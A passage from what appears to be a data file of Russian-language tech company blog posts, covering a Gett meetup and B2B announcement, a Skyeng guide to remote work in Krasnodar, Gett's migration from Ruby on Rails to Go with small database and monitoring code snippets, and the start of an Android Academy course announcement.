algorithms used in the solution and challenges we had to overcome. \n\nRon Ludmer, Gett, Senior Backend Developer at Matching & Ride Exchange Team – Redis-based Semaphore (доклад на английcком языке)\n\r\nAs the popularity of microservices architecture style increases, the risks that rise from working with a distributed system are getting more focus. One common problem is having our shared resources being accessed from multiple instances simultaneously, causing data inconsistency. What is the best way to ensure correctness with minimal damage to efficiency? Arguably, the simplest way is using locking mechanism. Ron are going to talk about different approaches to distributed locking, and the ways they tackled this issue at Gett, leading up to our current solution: Redis-based distributed lock implemented in Golang.\n\n\n\r\nКроме полезных докладов от крутых спикеров вас ждет море нетворкинга и, конечно, афтепати! Для участия необходима регистрация.\n\r\nА теперь немного про то, почему же именно сейчас мы решили объединить свои силы с Juno. \n\r\nПри учете того, что с самого начала Gett B2B сегмент был операционно прибылен (и при условии стратегии на общую прибыльность), это подтолкнуло Gett к перестроению своего ценностного предложения вокруг корпоративных клиентов и их потребностей.\n\r\nВ апреле 2017 года Gett купил Juno, стартап, оперирующий в Нью-Йорке с центром разработки в Минске. Juno — это райд-шеринг сервис, основанный в 2015 году. С самого старта Juno громко заявил о себе: сервис был запущен в Нью Йорке в мае 2016 года, а уже в сентябре 2016 года количество поездок превысило полмиллиона в месяц. В сентябре 2017 года количество успешных поездок превысило 1 миллион. На сегодняшний день Juno занимает одну из лидирующих позиций на рынке онлайн такси перевозок в Нью-Йорке.\n\r\nСейчас у Gett в приоритете технологическое обновление B2B-решения, для этих целей было принято решение объединить усилия минского офиса Juno и московской и израильских команд Gett RnD. \n\r\nПлатформа B2B закрывает все вопросы корпораций, связанные с поездкой: от заказа машины и ее мониторинга, до контроля расходов финансовой службой и формирования отчётов. \n\nКоманда Juno совместно с Gett будет работать над несколькими направлениями сервиса:\n\nПодключение сотрудников\r\nЧасто в корпорациях сотрудники не могут самостоятельно пользоваться сервисом такси и доставки: иногда заявка на поездку размещается через отдельного сотрудника/сервис. В каждой компании существуют свои политики поездок, и задача Gett B2B – максимально подстроиться под специфику каждого клиента: кастомизировать личный кабинет, учесть все правила и политики.\n\nКонтроль расходов\r\nОдна из наиболее осязаемых для клиента проблем, которую решает Gett B2B — это прозрачность затрат корпораций на транспорт. Прозрачность касается не только детализации счета каждой поездки, но и возможности агрегации в одном месте всех расходов, которые корпорация несет в каждом городе или стране. В дальнейшем эти отчёты используются, например, для возврата НДС.\n\r\nGett B2B решает эти проблемы, автоматизируя ручную работу администраторов и финансовой службы. Им не нужно больше собирать чеки, узнавать детали поездок, делать запросы по затратам в разные подразделения, вносить информацию по каждому сотруднику вручную и перепроверять несколько раз. Клиенты имеют возможность синхронизировать данные по SFTP или создавать поездки по API.\n\r\nКроме того, Juno и Gett будут совместно работать в направлениях Billing, Consumer Services и Vendor Connection.\n\r\nВыбор технологий B2B Solution направлен на эффективное решение задач стоящих перед современным диджитал-продуктом:\n\n\nподстраиваться под плавающую нагрузку характерную для ride-hailing рынка и эффективно масштабироваться помогают AWS & Kubernetes\n\nиметь возможность ежедневно радовать клиентов новым функционалом получается за счет Continuous delivery процессов, завязанных на Jenkins \n\nв точках наибольшей нагрузки системы эффективно и гибко использовать ресурсы, быть в ногу со временем удается с Go и Redis \n\nбыстро реагировать и воплощать продуктовые изменения, предоставляя отличный пользовательский опыт, возможно благодаря React/Redux & Ruby \n\nбыть частью микросервисной архитектуры, сохраняя консистентность данных, удается благодаря CloudAMQP\n\nследить за работоспособностью продукта и быть уверенным в высоком качестве и возможно с помощью экосистемы мониторинга и поиска аномалий, включающей PagerDuty, Airbrake, New Relic, Datadog и процессами Сontinuous integration со встроенными unit, component, integration тестами на Java/testNG/Selenium\n\n\n\r\nЕсли у вас есть вопросы – с удовольствием отвечу на них в комментариях к этому посту. И до встречи на митапе!", {"day": "30", "month": "августа", "time": "16:28"}, {"rate": 26, "views": 1700}], ["Среди людей, работающих удалённо в ИТ и не только, популярна привычка уезжать в тёплые края вроде Таиланда, Индонезии или Индии. На месяц-другой, а то и больше. Климат там приятнее, жизнь дешевле: так почему бы не сидеть за ноутбуком с видом на соленую воду? Мы знаем способ попасть в место с приятным климатом быстрее и проще.\n\n\n\r\nВот, например, Краснодар. По части климата там всё отлично: мягкая, довольно тёплая зима; жаркое, но не до адского пекла, лето; Чёрное море — в 120 км, Азовское — в 140. Жизнь заметно дешевле, чем в столицах, а сам город меньше — а потому тише и спокойнее. Кроме того, у Краснодара есть бонусы, каких не может предложить Таиланд: например, достаточно активное IT-сообщество. И не только.\n\r\nЧтобы узнать город получше, мы обратились к разработчику Skyeng Александру Федотову — он живёт в Краснодаре и, как большинство наших разработчиков, работает удалённо. С Сашиной помощью мы выяснили главное, что нужно знать об этом городе, если ехать туда на пару дней, недель, месяцев — или больше.\n\nЖильё\n\n\r\nОднокомнатную квартиру вы снимете тысяч за 12-15 в месяц, хотя есть и роскошные варианты за 40. Двухкомнатная обойдётся в 15-20 в месяц, а если хочется шикануть — выкладывайте тысяч 60.\n\n\n\r\nЦены на аренду частного дома начинаются от 16 — да, он маленький, но зато это с коммунальными платежами, хоть и без оплаты по показаниям счётчиков. За 100к в месяц можно снять дом на весёлую компанию — четыре спальни, зал с камином и подогреваемый бассейн.\n\n\nВид на доступное в аренду жилье из космоса. Поискать съёмную квартиру можно на том же ЦИАНе, откуда мы и взяли этот скрин. \n\nИнтернет\r\nПодключить интернет в съёмной квартире труда не составит, даже если вы арендатор: выбираете провайдера и тариф, заключаете договор на своё имя, вызываете техника, профит. Почти в любом доме будут представлены несколько провайдеров на выбор: Билайн, МТС, Ростелеком. \n\n\nВ каждом городе должна быть улица Ленина. Мы решили узнать, почём на ней всемирная паутина для народа. \n\r\nСравнить операторов и тарифы по конкретному адресу можно, например, здесь. Разброс — от 100 до 600 рублей в месяц.\n\r\nС интернетом в частном доме может быть сложнее, лучше выяснять это с владельцем. Впрочем, ситуация постепенно улучшается: к частным домам тянут оптику.\n\nОткуда работать\r\nЕсли не работать в офисе, комфортных мест для спокойной работы в городе не так много. Но они есть.\n\r\nТак, есть порядка 30 коворкингов и антикафе. Правда, Саша говорит, что интернет в таких местах обычно не очень хороший и, например, звонки могут стать проблемой. Тем не менее, он хорошо отзывается о коворкинге «Третье место» в ТРЦ «Галерея Краснодар» — доступный по цене и комфортный по атмосфере. Список других мест, например, тут.\n\n\nЧто-то из интерьеров коворкинга «Третье место»\n\r\nРаботать в краснодарских кафе не очень принято. Возможно, потому, что не слишком комфортно: часто бывает шумно, да и интернет оставляет желать лучшего. Другие общественные пространства вроде парков тоже не всегда подходят — в городе может быть довольно пыльно, в такое время на открытом воздухе с ноутбуком особо не посидишь.\n\nКак и на чём перемещаться\r\nПоездка из аэропорта в самый центр (на Театральную площадь) на Яндекс.Такси обойдётся примерно в 300 рублей. В городе представлены и другие крупные сервисы — Gett, Uber, Fasten, Максим, «Везёт».\n\n\nСлоган этого проекта как бы намекает\n\r\nВ Краснодаре случаются пробки, сопоставимые с московскими. Но для тех, кто предпочитает водить сам, работает Делимобиль.\n\r\nПередвигаться по городу часто проще и быстрее пешком, на велосипеде или электросамокате. Последние можно не только покупать, но и брать напрокат. К сожалению, стоит учитывать, что инфраструктуры велодорожек в городе практически нет. Самые смелые из велосипедистов и пользователей самокатов решаются ездить по проезжей части, остальные делят с пешеходами тротуары.\n\n\nВ городе появилось уже несколько сервисов аренды самокатов, например, этот.\n\r\nЕсть в Краснодаре пригородные и внутригородские электрички — расписание можно смотреть на сайте проекта «Наземка». Активисты надеются, что скоро дело дойдёт и до наземного метро, но пока оно только в планах.\n\nГде отдыхать\n\nРека Кубань. Мост Поцелуев между основной набережной и мысом Парка культуры и отдыха им. 30-летия Победы\n\r\nКраснодар иногда называют южной столицей России, и культурных событий здесь немало. «Афиша» вам в помощь! Для разнообразия, посоветуем Краснодарский академический театр драмы — сезон начнётся в сентябре.\n\n\n\r\nВ выходной вечер пройдитесь по Красноармейской улице — здесь сосредоточены клубы, в которые стоит идти на концерты. \n\r\nКрасную улицу от начала и до Театра драмы на все выходные и праздники делают пешеходной, так что здесь тоже вполне стоит гулять. Ещё стоит посетить парк, прилегающий к новому стадиону «Краснодар». Он не очень большой, но удачно устроен, и его называют одним из самых современных городских пространств в России. \n\n\n\r\nСам стадион, кстати, тоже заслуживает внимания. Открытый в 2016, он вмещает 35 тысяч человек и имеет все высшие допуски: право проводить финальные части чемпионатов мира и Европы по футболу, а также матчи всех стадий Лиги чемпионов и Лиги Европы УЕФА.\n\n\nЕсли знаете, что за конструкция перед ТЦ, пишите\n\r\nОстальные способы провести свободное время ждут вас в торгово-развлекательных центрах — кино, рестораны, боулинг, катки, караоке, детские зоны и аттракционы, батутные парки, картинг и многое другое. Крупнейшие — «Красная площадь», «OZ Mall», «Галерея Краснодар».\n\nПочинить технику\r\nОбращаться в первый попавшийся сервис по ремонту техники не стоит — и доломать могут, и вовсе не вернуть. Самый надёжный способ: поискать на сайте производителя авторизованные сервисы и обращаться в них. Если не нашлось — надо идти на главный региональный форум и спрашивать совета там. \n\nГде что искать\r\nГлавная соцсеть — ВКонтакте. Главные мессенджеры — WhatsApp и Telegram. Главный форум — Кубань.ру. Он же — ценный источник информации о городе и регионе. У портала два главных раздела: новости и, собственно, форум. По словам нашего разработчика Саши, всё, что нужно выяснить, можно выяснить там. Кстати, здесь есть раздел про интернет-технологии, где обсуждают невероятно широкий круг тем.\n\r\nНовости региона также можно узнавать на Юга.ру. Не стоит пренебрегать и сообществами «Типичный Краснодар» ВКонтакте, Telegram и Instagram.\n\r\nДля ориентирования на местности лучше использовать Яндекс.Карты — они точнее. Google Maps хороши в части панорам, а вот с точностью адресов у них проблемы.\n\n\nВидите человека с термосумкой? А он есть\n\r\nЗаказать доставку еды тоже можно у Яндекса — сервис агрегирует достаточно много ресторанов. Другой вариант — пользоваться мобильными приложениями сетей вроде Папа Джонс и прочих.\n\nUPD. В чате местного сообщества нам также порекомендовали сервис доставки еду с краснодарскими корнями Broniboy.\n\r\nИсполнителей на разные мелкие услуги можно попробовать поискать на региональном YouDo. Правда, сервис заработал во всех городах России только в прошлом году, так что объявлений здесь не то чтобы очень много.\n\nО работе\r\nГоворят, что когда краснодарцу нужно найти работу, первым делом он идёт на Мой круг — дать знать своей сети контактов. Вторым делом — на HeadHunter. А если это не помогло, можно попробовать поискать на уже упомянутом форуме Кубань.ру.\n\r\nРазброс зарплат большой: где-то от 15 до 150 тысяч рублей в месяц. Размер дохода во многом зависит от того, на кого вы работаете — и берете ли вы подработки. \n\nЕсли вы планируете устроиться в офис, типичными работодателями могут стать: \n\n\nВеб-студии. Студий в городе много, конкуренция высокая, работа потоковая, деньги небольшие, но и серьёзных навыков часто не требуется.\nЛокальные продуктовые компании. Из интересных в техническом плане местных проектов стоит отметить, например, Broniboy (сервис доставки) и Fasten (сервис такси с кэшбеком). О других местных компаниях можно почитать в этом списке.\nКрупные федеральные игроки. Это, прежде всего, телеком-операторы: Ростелеком, МТС. Также в городе есть офисы КРОК, «Спортмастера» и Nexign (экс-«Петер-сервис»). Конечно, нельзя не упомянуть и холдинг «Магнит» — в девяностых его марш по стране начался именно с Краснодара и других городов Юга России. Сейчас это огромная сеть, и разработчиков им, судя по сайту, нужно немало.\nМеждународные компании. Так, у разработчика популярной игры Vikings War of Clans — компании Plarium в Краснодаре есть офис на полтысячи человек. Один из двух офисов компании Arkadium тоже расположен здесь.\n\nЕсли же вы предпочитаете удаленку, важная группа работодателей — это стартапы или уже взрослые компании, которые ищут талантливые кадры по всей России и СНГ. Например, у нас в Skyeng все разработчики работают в распределенных командах и всегда рады толковым коллегам со знанием PHP и Angular. Кстати, будем рады поговорить про удаленку на ближайшем Krd.Dev в кулуарах.\n\nИ наконец — тусовочка\r\nГлавное конкурентное преимущество Краснодара перед Таиландом (и даже, пожалуй, Индией): местное сообщество. За последние несколько лет в городе появилось много движа: как разовые, так и регулярные митапы и конференции. \n\r\nТри встречи уже провело сообщество RedCode. Есть в Краснодаре и локальная Google Developers Group, сосредоточенная на технологиях понятно какой компании.\n\r\nНо главная «достопримечательность» айтишнго Краснодара — команда Krasnodar Dev Days, которая вот уже три года регулярно организует интересные события.\n\n\nСейчас Krasnodar Dev Days отвечают за направления: фронт, бэк, Java, Python. В центре Марк Ланговой, основатель сообщества\n\r\nВсего в команде у ребят семь человек, они провели уже больше дюжины мероприятий. Главная особенность команды в том, что для организации митапов они не ищут спонсора, а делают вход платным. По словам Марка, это помогает одновременно окупить расходы на организацию и не зависеть от мнения спонсора. Хотя, предложениям они открыты.\n\n\nПомимо митапов, ребята модерируют чаты для фронт — и бэк-разработчиков, чат питонистов, чат про вакансии и поиск работы, и большое сообщество ВКонтакте, где публикуются анонсы всего, что происходит в городе в сфере IT. \n\r\nГлавное их событие — ежегодная, уже четвертая Krasnodar Dev Conf, случится уже 24-25 августа. Будут доклады и от Skyeng: \n\n\nодин — в бэкенд-день, где наш Иван Матвеев расскажет, как концентрироваться на домене, слышать бизнес и делать быстро, качественно и доступно,\n\nвторой — во фронтенд-день, где наш коллега Кирилл Роговой расскажет, что происходит с кадром под капотом WebRTC, когда вы общаетесь с человеком в Skype, Hangouts или на нашей платформе для изучения языка.\n\n\nБудет действительно много крутых ребят, приходите на этот или следующий год \n\nОгромное спасибо за помощь с подготовкой статьи Александру Федотову, Марку Ланговому и Катерине Романенко, а также ребятам из чата сообщества в телеграме.\n\np.s. Дополняйте пост ценной информацией и впечатлениями о городе в комментариях, это поможет другим. Спасибо!     Только зарегистрированные пользователи могут участвовать в опросе. Войдите, пожалуйста. Про какой город написать дальше \n            7.21%\n           Ульяновск \n            30\n           \n            18.27%\n           Самара \n            76\n           \n            40.63%\n           Казань \n            169\n           \n            12.74%\n           Саратов \n            53\n           \n            18.27%\n           Волгоград \n            76\n           \n            17.55%\n           Томск \n            73\n           \n            10.58%\n           Тольятти \n            44\n            \n       Проголосовали 416 пользователей. \n\n       Воздержались 147 пользователей.", {"day": "21", "month": "августа", "time": "10:40"}, {"rate": 37, "views": 31000}], ["Всем привет! Меня зовут Максим Рындин, я тимлид двух команд в Gett – Billing и Infrastructure. Хочу рассказать про продуктовую веб-разработку, которую мы в Gett ведем преимущественно на языке Go. Я расскажу, как в 2015-2017 годах мы переходили на этот язык, почему вообще его выбрали, с какими проблемами столкнулись во время перехода и какие решения нашли. А о текущей ситуации расскажу уже в следующей статье.\n\r\nДля тех, кто не знает: Gett — это международный сервис заказа такси, который был основан в Израиле в 2011 году. Сейчас Gett представлен в 4 странах: Израиль, Великобритания, Россия и США. Основные продукты нашей компании — это мобильные приложения для клиентов и водителей, веб-портал для корпоративных клиентов, где можно заказать машину, и еще куча внутренних админок, через которые наши сотрудники настраивают тарифные планы, подключают новых водителей, мониторят случаи мошенничества и многое другое. В конце 2016 года в Москве открылся глобальный офис R&D, который работает в интересах всей компании.\n\nКак мы пришли к Go\r\nВ 2011 году основной продукт компании представлял из себя монолитное приложение на Ruby on Rails, потому что в то время этот фреймворк был очень популярен. Были успешные примеры бизнесов, довольно быстро разработанных и запущенных на Ruby on Rails, поэтому он ассоциировался с успехом в бизнесе. Компания развивалась, к нам приходили новые водители и пользователи, нагрузки росли. И стали появляться первые проблемы.\n\r\nЧтобы в клиентском приложении отображать местоположение машины, и чтобы её движение выглядело как плавная кривая, водители должны довольно часто посылать свои координаты. Поэтому конечная точка, отвечавшая за прием координат от водителей, практически всегда была самой высоконагруженной. А фреймворк веб-сервера в Ruby on Rails с этим справлялся плохо. Масштабироваться можно было только экстенсивно, добавляя новые серверы приложений, а это дорого и неэффективно. В итоге мы вынесли функциональный сбор координат в отдельный сервис, который изначально был написан на JS. На время это решило проблему. Однако по мере роста нагрузки, когда мы подошли к 80 тыс. RPM, сервис на Node.js перестал нас спасать.\n\r\nТогда мы объявили хакатон. У всех сотрудников в компании была возможность за день написать прототип, который должен был собирать координаты водителей. Здесь приведены бенчмарки двух версий того сервиса: работавшей на проде и переписанной на Go.\n\n\r\nПрактически по всем показателям сервис на Go показывал лучшие результаты. Cервис на Node.js использовал кластер, это технология использования всех ядер машины. То есть эксперимент был плюс-минус честным. Хотя Node.js имеет недостаток в виде однопоточного runtime’а, однако он никак не влиял на результаты.\n\r\nПостепенно наши продуктовые запросы росли. Мы разрабатывали всё больше функциональности, и однажды столкнулись с такой проблемой: когда добавляешь какой-то кусочек кода в одном месте, то может что-то сломаться в другом месте, где проект сильно связан. Решили побороть эту напасть с помощью перехода на сервис-ориентированную архитектуру. Но в результате ухудшилась производительность: когда при исполнении кода интерпретатором Ruby on Rails встречается сетевой запрос, он блокируется и воркер простаивает. А операций сетевого ввода-вывода у нас становилось всё больше.\n\r\nВ результате мы решили принять Go в качестве одного из основных языков разработки.\n\nОсобенности нашей продуктовой разработки\r\nВо-первых, у нас очень разные требования к продукту. Поскольку наши машины ездят в трёх странах с абсолютно разным законодательством, нужно реализовывать и очень сильно различающиеся наборы функциональности. Например, в Израиле законодательно требуется, чтобы стоимость поездки считал таксометр — это прибор, который проходит обязательную сертификацию раз в несколько лет. Когда водитель начинает поездку, то нажимает кнопку «поехали», а когда заканчивает, то нажимает кнопку «стоп», и вводит показанную таксометром цену в приложение.\n\r\nВ России таких жестких законов нет. Здесь мы можем сами настраивать политику формирования цены. Например, привязывать её к длительности поездки или к расстоянию. Порой, когда мы хотим реализовать одну и ту же функциональность, то сначала выкатываем её в одной стране, а потом адаптируем и выкатываем в других странах.\n\r\nНаши продакт-менеджеры задают требования в виде продуктовых историй, мы стараемся придерживаться именно такого подхода. Это автоматически накладывает отпечаток и на тестирование: мы используем методологию behaviour driven-разработки, чтобы можно было проецировать поступающие продуктовые требования на тестовые ситуации. Так легче люди, далёкие от программирования, могут просто читать результаты тестов и понимать, что к чему.\n\r\nТакже мы хотели избавиться от дублирования каких-то работ. Ведь если у нас есть сервис, который реализует какую-то функциональность, и нам нужно написать второй сервис, заново решая все проблемы, которые мы решили в первом, заново интегрировать с инструментами мониторинга и миграции, то это будет неэффективно.\n\nРешаем проблемы\nФреймворк\r\nRuby on Rails построен по архитектуре MVC. На момент перехода мы очень не хотели от неё отказываться, чтобы облегчить жизнь тем разработчикам, которые умеют программировать только на этом фреймворке. Смена инструментария и без того не добавляет комфорта, а если при этом ещё и меняешь архитектуру приложения, это всё равно, что человека, не умеющего плавать, столкнуть с лодки. Мы не хотели так травмировать разработчиков, поэтому взяли один из немногих на тот момент MVC-фреймворков, который называется Beego.\n\r\nПопробовали с помощью Beego, как на Ruby on Rails, сделать серверный рендеринг. Однако отрисованная на сервере страница нам очень сильно не понравилась. Пришлось выкинуть один компонент, и сегодня Beego выдает с бэкенда только JSON, а всю отрисовку выполняет React на фронте.\n\r\nBeego позволяет собирать проект автоматически. Некоторым разработчикам было очень тяжело переходить со скриптового языка к необходимости компилировать. Были смешные истории, когда человек реализовывал какую-то фичу, и только на код-ревью или вообще случайно узнавал, что, оказывается, нужно делать Go-сборку. А задача уже закрыта.\n\r\nВ Beego рутер генерируется из комментария, в который разработчик пишет путь к экшенам контроллеров. Отношение к этой идее у нас неоднозначное, потому что если в пути опечатка, — например, пересобрался рутер, — то тем, кто не искушен в таком подходе, тяжело найти ошибку. Люди, порой, не могли разобраться в причинах даже после нескольких часов увлекательного дебага.\n\nБаза данных\r\nВ качестве БД мы используем PostgreSQL. Есть такая практика — контролировать схему базы данных из кода приложения. Это удобно по нескольким причинам: все о них знают; их легко развёртывать, база всегда синхронизирована с кодом. И эти плюшки мы тоже хотели сохранить.\n\r\nКогда у вас есть несколько проектов и команд, иногда для реализации функциональности приходится залезать в чужие проекты. И бывает очень велик соблазн добавить в таблицу колонку, в которой может оказаться 10 млн записей. А человек, который не погружен в этот проект, может не догадываться о размере таблицы. Чтобы это предотвращать, мы сделали предупреждение об опасных миграциях, которые могут заблокировать базу на запись, и давали разработчикам средство, чтобы это предупреждение убрать.\n\nМиграция\r\nМигрировать мы решили с помощью Swan, который представляет собой пропатченный goose, в который внесли пару доработок. Эти двое, как и многие инструменты миграции, всё хотят делать в одной транзакции, чтобы в случае проблем можно было легко откатиться. Иногда бывает, что нужно построить индекс, а таблица заблокировалась. В PostgreSQL есть параметр concurrently, который позволяет этого избегать. Проблема в том, что если в PostgreSQL начинаешь строить индекс на этом concurrently, да ещё и в транзакции, то выскочит ошибка. Сначала мы хотели добавить флаг, чтобы не открывать транзакцию. А в итоге поступили так:\n\nCOMMIT;\nCREATE INDEX CONCURRENTLY huge_index ON huge_table (column_one, column_two);\nBEGIN;\r\nТеперь, когда кто-то добавляет индекс с параметром concurrently, ему выпадает эта подсказка. Обратите внимание, commit и begin не перепутаны местами. Этот код закрывает транзакцию, которую открыл инструмент миграции, затем накатывает индекс с параметром concurrently, а после этого открывает еще одну транзакцию, чтобы инструмент что-то закрыл.\n\nТестирование\r\nМы стараемся придерживаться behaviour driven-разработки. В Go это можно сделать с помощью инструмента Ginkgo. Он хорош тем, что в нем есть привычные для BDD ключевые слова, «describe», «when» и другие, а также позволяет просто проецировать текст, написанный продакт-менеджером, на тестовые ситуации, которые хранятся в исходном коде. Но мы столкнулись с проблемой: люди, которые пришли из мира Ruby on Rails, считают, что в любом языке программирования есть нечто, похожее на factory girl — фабрику для создания начальных условий. Однако в Go ничего подобного не было. В итоге мы решили, что не будем изобретать велосипед: просто перед каждым тестом, в хуках до и после выполнения теста наполняем базу нужными данными, а потом её чистим, чтобы не было побочных эффектов.\n\nМониторинг\r\nЕсли у вас есть production-сервис, к которому обращаются люди, то нужно отслеживать его работу: нет ли пятисотых ошибок, быстро ли обрабатываются запросы. В мире Ruby on Rails для этого очень часто используют NewRelic, и многие наши разработчики хорошо им владели. Они понимали, как работает инструмент, куда нужно посмотреть, если есть какие-то проблемы. NewRelic позволяет анализировать время обработки запросов по HTTP, выявлять медленные внешние вызовы и запросы в базу данных, отслеживать потоки данных, предоставляет интеллектуальный анализ ошибок и выдаёт предупреждения.\n\r\nВ NewRelic есть агрегатная функция Apdex, которая зависит от гистограммы распределения длительности ответов и каких-то значений, которые вы считаете нормальными и которые задаются в самом начале. Эта функция также зависит от уровня ошибок в приложении. NewRelic вычисляет Apdex и выдаёт предупреждение, если её значение падает ниже какого-то уровня.\r\nТакже NewRelic хорош тем, что с недавнего времени появился официальный агент для Go. Вот так выглядит общий обзор мониторинга:\n\n\n\r\nСлева диаграмма обработки запросов, каждый из которых разбит на сегменты. Сегменты включают в себя request queuing, обработку промежуточными обработчиками (middleware), длительность пребывания в интерпретаторе Ruby on Rails и обращения к хранилищам.\n\r\nСправа сверху выводится график Apdex. Снизу справа — частота обработки запросов.\n\r\nИнтрига заключается в том, что в Ruby on Rails для подключения NewRelic нужно добавить одну строчку кода и дописать в конфигурацию свои учетные данные. И всё волшебным образом работает. Такое возможно благодаря тому, что в Ruby on Rails есть monkey patching, которого нет в Go, поэтому приходится много чего делать вручную.\n\r\nВ первую очередь мы хотели измерять длительность обработки запросов. Это удалось сделать с помощью хуков, которые предоставляет Beego.\n\nbeego.InsertFilter(\"*\", beego.BeforeRouter, StartTransaction, false)\nbeego.InsertFilter(\"*\", beego.AfterExec, NameTransaction, false)\nbeego.InsertFilter(\"*\", beego.FinishRouter, EndTransaction, false)\r\nЕдинственный нетривиальный момент заключался в том, что мы разделили открытие транзакции и её именование. Почему мы это сделали? Хотелось измерять длительность обработки запроса с учётом затрат времени на маршрутизацию. При этом нужны отчёты, агрегированные по конечным точкам, на которые приходили запросы. Но на момент открытия транзакции у нас пока еще не определен шаблон URL, по которому произойдет совпадение. Поэтому при поступлении запроса мы открываем транзакцию, затем на хуке, после выполнения контроллера, именуем её, а после отработки — закрываем. Поэтому сегодня наши отчёты выглядят так:\n\n\r\nМы использовали ORM под названием GORM, потому что хотелось сохранить абстракцию и не заставлять разработчиков писать чистый SQL. У этого подхода есть как достоинства, так и недостатки. В мире Ruby on Rails есть ORM Active Record, которая очень избаловала людей. Разработчики забывают о том, что можно писать чистый SQL, и оперируют только вызовами ORM.\n\ndb.Callback().Create().Before(\"gorm:begin_transaction\").\nRegister(\"newrelicStart\", startSegment)\ndb.Callback().Create().After(\"gorm:commit_or_rollback_transaction\").\nRegister(\"newrelicStop\", endSegment)\r\nЧтобы измерить длительность выполнения запросов в базе данных при использовании GORM, нужно взять объект db. Вызов Callback говорит о том, что мы хотим зарегистрировать обратный вызов. Он должен вызываться при создании новой сущности — вызове Create. Затем укажем, когда именно нужно запускать Callback. За это отвечает Before с аргументом gorm: begin_transaction — это некоторая точка в момент открытия транзакции. Далее мы с именем newrelicStart регистрируем функцию startSegment, которая просто вызывает Go-агент и открывает новый сегмент обращения к базе данных.\n\r\nORM вызовет эту функцию перед тем, как мы откроем транзакцию, и тем самым откроет сегмент. То же самое мы должны сделать для закрытия сегмента: просто навесим Callback.\n\r\nКроме PostgreSQL мы используем Redis, с которым тоже не всё гладко. Для этого мониторинга мы написали обертку над стандартным клиентом, и то же самое сделали для вызова внешних сервисов. Вот что получилось:\n\n\n\r\nТак выглядит мониторинг для приложения, написанного на Go. Слева отчет по длительности обработки запросов, состоящей из сегментов: исполнение самого кода в Go, обращение к базам PostgreSQL и Replica. На этом графике не отображаются обращения ко внешним сервисам, потому что их очень мало и при усреднении просто незаметны. Также у нас есть информацию по Apdex и по частоте обработки запросов. В целом мониторинг получился довольно информативным и полезным для использования.\n\r\nЧто касается потоков данных, то благодаря нашим оберткам над HTTP-клиентом мы можем отслеживать запросы ко внешним сервисам. Здесь обозначена схема запросов сервиса promotion: он обращается к четырём другим нашим сервисам и двум хранилищам.\n\n\n\nЗаключение\r\nСегодня у нас более 75 % production-сервисов написаны на Go, активную разработку на Ruby не ведём, а только поддерживаем. И в связи с этим хочу отметить:\n\n\nОпасения, что скорость разработки уменьшится, не подтвердились. Программисты вливались в новую технологию каждый в своём режиме, но, в среднем, через пару недель активной работы разработка на Go становилась такой же предсказуемой и быстрой, как и на Ruby on Rails. \n\nПроизводительность приложений на Go под нагрузкой приятно удивляет по сравнению c прошлым опытом. Мы ощутимо сэкономили на использовании инфраструктуры в AWS, в разы уменьшив количество используемых инстансов. \n\nСмена технологии заметно взбодрила программистов, а это важная часть успешного проекта. \n\nСегодня мы уже ушли от Beego и Gorm, подробнее об этом будет в следующей статье.\n\n\r\nРезюмируя, хочу сказать, что если вы пишете не на Go, страдаете от проблем высоких нагрузок и соскучились по движухе — переходите на этот язык. Только не забудьте договориться с бизнесом.", {"day": "9", "month": "августа", "time": "15:12"}, {"rate": 36, "views": 11000}], ["Всем привет! Лето — это отличное время года. Подошли к концу Google I/O, Mobius и AppsConf, а многие студенты уже закрыли или вот-вот уже закончат сдавать сессии, все готовы выдохнуть и наслаждаться теплом и солнцем. \n\r\nНо только не мы!\n\r\nМы долго и упорно готовились к этому моменту, стараясь завершить свои дела по работе и проектам, накопить сил, чтобы наконец вернуться к вам с новостями: Android Academy возвращается в Москву. \n\nUPD от 5.07: Друзья, регистрация заполнилась и закрыта. Но лекции обязательно будет выложены на канале, подписывайтесь и ждите выхода видео. А в телеграм-канале с новостями будут анонсы будущих лекций, подписывайтесь, чтобы не пропустить следующую!\n\r\nА под катом мы расскажем, что вас ждет в этом году.\n\n\n\r\nНовый этап школы мобильной разработки Android Academy стартует 25 июля, в офисе Авито, в 19:00. Мы уже знакомились с вами прошлым летом, отчитывались об итогах курса Fundamentals, а теперь хотим поделиться планами на этот год. \n\r\nНовый курс называется Advanced, и в нем мы расскажем вещах, которые с нашей точки зрения, необходимо знать каждому грамотному специалисту.\n\nПочему мы вообще это делаем?\r\nДумаю, всем из вас известно чувство удовлетворения, когда вы выложились на 100% и смотрите на результат своего труда. И вдвойне приятно, когда вы выложились, и результат не ушел в стол, не стал просто очередным KPI. Когда этот результат чуть-чуть, но улучшил что-то, что для вас важно. Для нас важно развитие android-комьюнити в России, чтобы появлялось больше разработчиков, которые понимают важность общения друг с другом и знают, куда они могут прийти для обмена опытом и знаниями. Это важно, потому что далеко не у всех есть менторы или старшие товарищи, которые могут помочь им в развитии.\n\n\n\r\nЛично мне еще очень нравится именно помогать другим людям понять что-то новое. Меня очень увлекает процесс познания, и, помогая другим что-то понять, я слышу вопросы, которые сама бы себе не задала. Приходится формулировать словами то, что, как мне кажется, я знаю. Это помогает найти слабые места и понять, что я на самом деле знаю, а что нет.\n\r\nКроме этого, было дико интересно наблюдать за тем, как люди растут, что им интересно, просто общаться и дружить. Было очень круто, когда мои студенты попали на работу в Яндекс, и я ими очень горжусь. Но помимо этого я горжусь всеми, кто был с нами, приходил на лекции, участвовал в хакатоне. Все мы вместе проделали огромную работу, и это большая радость — быть частью такой мощной команды.\n\n\n\r\nИ самое приятное, что это чувствуем не только мы. Вот некоторые отзывы из тех, что мы собирали после лекций:\n\nВсе так круто, что даже не верится!\nКурс отличный! Максимум полезной информации за ограниченный промежуток времени. Особенно ценно, что актуальность информации подтягивалась прямо в реальном времени (тот же переход на androidx, например), а не про какие-то уже устаревшие технологии рассказывали (а если и рассказывали, то только для общей информации, и предупреждая о их устаревании или несовершенстве). \n\r\nЕще раз большое спасибо всем за курс! И жду с нетерпением его продолжения :)))\nБудем ждать от вас новых лекций :>\nВы просто супер! Все очень здорово, не перестаю восхищаться вашим альтруизмом и энергией. Спасибо вам огромное, что вы есть.\r\nКонечно, не всё так радужно, у нас есть и полезные критические отзывы, которые мы постараемся учесть в этом году. В частности, добавим больше интерактива (:\n\r\nЕсли в прошлом году вы хотели поучаствовать, но в силу каких-то причин не смогли, то в этом году есть шанс попробовать еще раз! Но учитывайте, что в этом году курс будет сложнее, и чтобы получить пользу, нужно уже разбираться в android в какой-то степени.\n\nЧто вас ждет\r\nВ этом году курс будет состоять из 6 лекций по 1.5 часа каждые 2-3 недели. По итогам бурных обсуждений, составления таблиц по важности/интересности и опроса студентов прошлого года, мы 